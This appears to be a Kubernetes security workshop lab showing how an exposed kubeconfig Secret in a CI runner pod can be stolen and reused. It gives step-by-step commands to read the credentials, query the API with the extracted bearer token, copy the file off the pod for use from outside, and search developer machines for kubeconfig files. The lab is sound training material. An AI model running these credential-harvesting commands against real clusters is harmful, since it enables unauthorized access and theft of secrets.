# Kubeconfig File

A kubeconfig file is a self-contained set of cluster credentials. Any attacker who obtains it gains the same level of API access as the identity it represents — often with no further authentication required.

## Description

The kubeconfig file, used by `kubectl` and other Kubernetes clients, contains cluster endpoint URLs, TLS certificate data, and user credentials (certificates, tokens, or OIDC refresh tokens). If the cluster is hosted as a cloud service (such as AKS or GKE), this file is downloaded to the client via cloud commands (`az aks get-credentials` for AKS, `gcloud container clusters get-credentials` for GKE).

Kubeconfig files end up in unexpected places:

- Stored as Kubernetes Secrets and mounted into CI/CD runner pods.
- Checked into source control repositories by mistake.
- Copied to shared file systems or S3 buckets.
- Left in Docker image layers during a multi-stage build.
- Present on a compromised developer workstation at `~/.kube/config`.

An attacker who reads the file from any of these locations can immediately authenticate to the cluster from anywhere with network access.

## Prerequisites

- A running Kubernetes cluster (Kind `workshop-cluster` is assumed).
- `kubectl` installed and configured to connect to your cluster.

## Quick Start

### 1. Deploy the scenario

This deploys a `ci-runner` pod that has a kubeconfig Secret mounted into it, simulating a common CI/CD runner setup.

```bash
kubectl apply -f kubeconfig-exposure.yaml
```

Wait for the pod to be ready:

```bash
kubectl wait --for=condition=Ready pod/ci-runner -n kubeconfig-lab --timeout=60s
```

### 2. Patch the secret with a real token (makes the demo fully functional)

The placeholder token in the Secret must be replaced with a real service account token so API calls inside the pod actually work. Run this from your workstation:

```bash
# Create a real service account token for the default SA in kubeconfig-lab
REAL_TOKEN=$(kubectl create token default -n kubeconfig-lab --duration=3600s)

# Build and base64-encode the new kubeconfig with the real token
NEW_CONFIG=$(cat <<EOF
apiVersion: v1
kind: Config
clusters:
- cluster:
    server: https://kubernetes.default.svc.cluster.local
    insecure-skip-tls-verify: true
  name: workshop-cluster
contexts:
- context:
    cluster: workshop-cluster
    user: admin
  name: workshop-context
current-context: workshop-context
users:
- name: admin
  user:
    token: ${REAL_TOKEN}
EOF
)
NEW_CONFIG_B64=$(printf '%s' "$NEW_CONFIG" | base64 | tr -d '\n')

# Patch the secret directly (avoids re-applying the YAML which would reset it)
kubectl patch secret admin-kubeconfig -n kubeconfig-lab \
  -p "{\"data\":{\"config\":\"${NEW_CONFIG_B64}\"}}"
```

Delete and recreate **only the pod** (do not re-apply the full YAML, as that would reset the secret back to the placeholder):

```bash
kubectl delete pod ci-runner -n kubeconfig-lab
kubectl wait --for=delete pod/ci-runner -n kubeconfig-lab --timeout=30s

# Recreate only the pod — NOT the full YAML (which would overwrite the patched secret)
kubectl run ci-runner -n kubeconfig-lab \
  --image=alpine:latest \
  --restart=Never \
  --overrides='{
    "spec": {
      "serviceAccountName": "default",
      "containers": [{
        "name": "runner",
        "image": "alpine:latest",
        "command": ["/bin/sh", "-c", "apk add --no-cache curl > /dev/null 2>&1 && sleep 3600"],
        "volumeMounts": [{"name": "kubeconfig-volume", "mountPath": "/root/.kube", "readOnly": false}],
        "env": [{"name": "KUBECONFIG", "value": "/root/.kube/config"}]
      }],
      "volumes": [{
        "name": "kubeconfig-volume",
        "secret": {"secretName": "admin-kubeconfig", "items": [{"key": "config", "path": "config"}]}
      }]
    }
  }'

kubectl wait --for=condition=Ready pod/ci-runner -n kubeconfig-lab --timeout=60s
```

### 3. Simulate an attacker gaining access to the pod

An attacker who has RCE on the CI runner (or who has stolen `kubectl` credentials) executes into the pod:

```bash
kubectl exec -it pod/ci-runner -n kubeconfig-lab -- /bin/sh
```

### 4. Locate and read the kubeconfig file

Inside the pod:

```bash
# The KUBECONFIG environment variable reveals the file location
echo $KUBECONFIG

# Read the kubeconfig — credentials are plaintext
cat /root/.kube/config
```

The output contains the cluster server URL and the bearer token. Copy it.

### 5. Use the kubeconfig to access the cluster API

Still inside the pod, extract the token from the kubeconfig and use `curl` to query the Kubernetes API directly:

```bash
# Extract the token and API server from the kubeconfig
TOKEN=$(grep 'token:' /root/.kube/config | awk '{print $2}')
APISERVER=$(grep 'server:' /root/.kube/config | awk '{print $2}')

# List namespaces using the stolen token
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces" \
  | grep '"name"'

# List all pods across namespaces
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" \
  | grep '"name"' | head -20

# List secrets
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" \
  | grep '"name"'
```

### 6. Exfiltrate and use the kubeconfig from outside the cluster

On your workstation, simulate an attacker who has exfiltrated the file:

```bash
# Save the kubeconfig from the pod to your local machine
kubectl exec pod/ci-runner -n kubeconfig-lab -- cat /root/.kube/config > /tmp/stolen-kubeconfig.yaml
```

The stolen kubeconfig uses the internal cluster DNS name `kubernetes.default.svc.cluster.local`. To use it from outside the cluster, replace the server URL with the real API server address:

```bash
# Get the actual API server endpoint from your local kubeconfig
REAL_SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')

# Update the stolen kubeconfig to use the real external endpoint
sed -i.bak "s|https://kubernetes.default.svc.cluster.local|${REAL_SERVER}|g" /tmp/stolen-kubeconfig.yaml

# Now use the stolen kubeconfig from outside the cluster
KUBECONFIG=/tmp/stolen-kubeconfig.yaml kubectl get namespaces
KUBECONFIG=/tmp/stolen-kubeconfig.yaml kubectl get secrets -n kubeconfig-lab
```

The stolen kubeconfig grants the same access as the service account it embeds — from any machine that can reach the API server.

### 7. Check common kubeconfig locations on a developer machine

An attacker with access to a developer workstation (via phishing, physical access, or a compromised endpoint) looks in predictable places:

```bash
# Primary kubeconfig location
cat ~/.kube/config

# Additional kubeconfig files referenced by KUBECONFIG
echo $KUBECONFIG

# Common locations where kubeconfigs are accidentally committed
find ~/.config -name "*.yaml" 2>/dev/null | xargs grep -l "current-context" 2>/dev/null
find /tmp -name "kubeconfig*" 2>/dev/null
```

## Cleanup

```bash
kubectl delete -f kubeconfig-exposure.yaml
rm -f /tmp/stolen-kubeconfig.yaml
```

## Resources

- [Organizing Cluster Access Using kubeconfig Files](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/)
- [MITRE ATT&CK: Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)
- [Kubernetes Security Best Practices: Protecting kubeconfig](https://kubernetes.io/docs/concepts/security/security-checklist/)
- [Detecting kubeconfig Abuse](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
